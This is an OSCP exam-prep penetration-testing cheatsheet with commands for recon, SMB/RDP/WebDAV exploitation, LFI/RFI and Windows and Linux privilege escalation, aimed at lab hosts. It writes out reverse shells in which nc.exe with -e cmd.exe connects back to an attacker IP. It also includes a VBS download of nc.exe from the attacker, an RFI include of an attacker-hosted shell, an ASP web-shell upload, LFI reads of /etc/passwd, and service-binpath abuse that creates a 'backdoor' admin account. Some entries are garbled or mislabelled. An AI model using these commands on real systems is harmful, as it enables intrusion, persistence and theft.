# OSCP Cheatsheet

## RECON

Enumeration Mindmap: https://github.com/DigitalAftermath/EnumerationVisualized/wiki

Port Scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
# PORT SCANS
$ nmap 10.11.1.71 --top-ports 20 --open
$ nmap 10.11.1.71 -p- -sV

# NSE
$ ls -l /usr/share/nmap/scripts/*ssh*
$ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
```

Apache server not working properly? Try use:
`$ python -m SimpleHTTPServer 8080`

## SERVICES

__FTP (21)__

Fingerprint FTP server:
* `nc 10.11.1.125 21`
* telnet 10.11.1.125

Access Telnet via. URL:
* ftp://10.11.1.125


__SSH (22)__

Fingerprint server/OS, SSH key.
Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su root`



__HTTP (80|8080|443|8443 etc.)__

See section "WEB" for juicy web stuff.



__Telnet (23)__

Stuff



__SMTP (25)__

`$ snmp-check [ target ]`


__SMB / NETBIOS / SMBD (135-139 - 445)__

SMB enumeration
```bash
$ nmblookup -A 10.11.1.XXX
$ smbclient //MOUNT/share -I 10.11.1.XXX -N
$ rpcclient -U "" 10.11.1.XXX
$ enum4linux 10.11.1.XXX        // enum info from Windows and Samba hosts 

# Find named pipes
`msfconsole> use auxiliary/scanner/smb/pipe_auditor`
```

Accessing shared dirs:
* `smbclient \\\\10.11.1.75\\Users` or just `smbclient \\\\10.11.1.75\\{SHARE_NAMES}`
* `smb:\> put src_file remote_file`
* `smb:\> get remote_file`
* Put nc.exe => reverse shell
* Get password files => access via. ssh/ rdp

MS17-010 Code Exec
* `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
* `PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe`
* `runas`
* `nc.exe 10.11.0.42 443 -e cmd.exe`
* Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

Privesc
* Mount shared drives: `net use z: \\10.11.1.49\Users /user:alice aliceishere`

Working exploits:
* [MS08-067] NetAPI module in Windows SMB
* [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
* [MS17-010 ALTERNATIVE METHOD]: Adding new admin account https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit



__SMBD / SAMBA (139)__

SMBD/Sambda is a server to provide SMB service to clients

Working exploits:
* Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7



__MSRPC (135)__
* Stuff


__RDP (3389)__

If you have credentials, you can enable the RDP service:
```
# METHOD 1
$ netsh firewall set service RemoteDesktop enable

# METHOD 2
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# METHOD 3
$ reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

# METHOD 4
$ sc config TermService start= auto
$ net start Termservice
$ netsh.exe

# 
firewall
add portopening TCP 3389 "Remote Desktop"
OR: 
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=udp
```





## WEB

```bash
$ curl -i -L 10.11.1.71    # Follow re-directs
$ gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

Denied from accessing /robots.txt?
* Try change the user agent i.e. `curl -v http://10.11.1.39/robots.txt -H "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`

Exploit code not working? Try:
* Full directory paths to binaries and your files e.g. `/usr/bin/wget http:example.com -o /full/path/to/file.txt`

ColdFusion vulns
* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/

WEBDAV vulns - using tools . 
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
```bash
$ davtest -url 10.11..113                                 # test for webdav vulns
$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
          -uploadfile rshell.asp -uploadloc rshell.html
$ cadaver
dav:!> open 10.11.1.13                                    # open connection to URL
dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
```

WEBDAV vulns - manual
```bash
$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
```

Apache
* Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout

phpLiteAdmin 1.9.3 Remote PHP Code Injection:
* https://v3ded.github.io/ctf/zico2.html


LFI / RFI
(LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
```
# Append NULL bytes (prevent .ext concat to the end by application)
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=../../../etc/passwd%en
http://example.com/index.php?page=../../../etc/passwd%00%en
```

PHP
* Check `phpinfo()`
* RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions

## INITIAL EXPLOITATION

Reverse shell cheatsheet:
* http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/

Metasploit reverse shell payloads:
* http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/

If reverse shell hangs / dies:
* Try a different port, try a different port. E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
* A firewall may be blocking / disconnecting you on the port.
* Try a bind shell instead of reverse shell.

## KERNEL EXPLOITS

FreeBSD 9.0
* FreeBSD 9.0 - Intel SYSRET: https://www.exploit-db.com/exploits/28718

## PRIVILEGE ESCALATION

Quick Wins:
```bash
# THIS HAS WORKED BEFORE: Due to misconfiguration in /etc/sudoers
$ sudo su	# execute su as root
$ su root	# become root
```

General privesc guide:
* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73

Linux privesc:
* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py (automated - suggests exploits)
* https://github.com/rebootuser/LinEnum (automated)
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check (automated - Kali)
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)

Windows privesc:
* Automated scanner: https://github.com/azmatt/windowsEnum (automated)
* http://www.fuzzysecurity.com/tutorials/16.html
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc#Windows%20version%20map
* http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html


TTY spawn cheatsheet: https://netsec.ws/?p=337

__LINUX PRIVESC__

Spawn TTY for linux:
* `python -c 'import pty; pty.spawn("/bin/sh")'`

UDEV
* Guide: http://www.madirish.net/370
* Exploit Code: https://www.exploit-db.com/exploits/8478

__WINDOWS PRIVESC__

Accesschk.exe:
* http://www.fuzzysecurity.com/tutorials/16.html
```
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

Psexec.exe:
* https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Net Use:
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Windows file transfer methods:
```vbs
# Copy/paste into Windows shell: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
# Run:
$ cscript wget.vbs http://10.11.0.42/nc.exe
```
Vulnerable services:
```powershell
# Vulnerable services
sc qc <vulnerable service name>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 

sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
net start <vulnerable-service>
```

## MSFVENOM PAYLOADS

Msfvenom commands:
* https://netsec.ws/?p=331


### COMPILING EXPLOIT CODE

Compilation tips:
* `./exploit` results in errors: compile in the host itself, Kali box or another machine.

Compilation commands:
```bash
# Linux
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit

# Windows (cross-compile) and run
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
$ wine exploit.exe
```


